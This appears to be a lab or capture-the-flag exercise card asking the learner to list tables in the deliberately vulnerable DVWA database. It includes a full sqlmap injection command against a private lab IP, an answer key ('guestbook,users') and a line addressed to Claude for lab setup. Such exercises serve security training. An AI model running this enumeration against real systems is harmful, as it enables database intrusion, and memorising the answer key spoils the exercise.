# Q253 — List Tables in Database

| Field | Value |
|-------|-------|
| **Target** | `192.168.52.129` |
| **Domain** | Web Apps / SQL Injection |
| **Difficulty** | 🟢 Easy |
| **Tools** | `sqlmap` |
| **Time budget** | 5–10 min |

---

## 📝 Question

"List all tables in the `dvwa` database using sqlmap. Report the table names."

---

## 🎯 Flag Format

```
tables=<comma_separated>
```

---

## ✅ Solution

```bash
sqlmap -u "http://192.168.52.129/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=<session>;security=low" -D dvwa --tables --batch
```

**Answer:** `tables=guestbook,users`

---

## 🤖 Claude Setup Prompt

Same as Q251. Report back: "Lab ready for Q253"
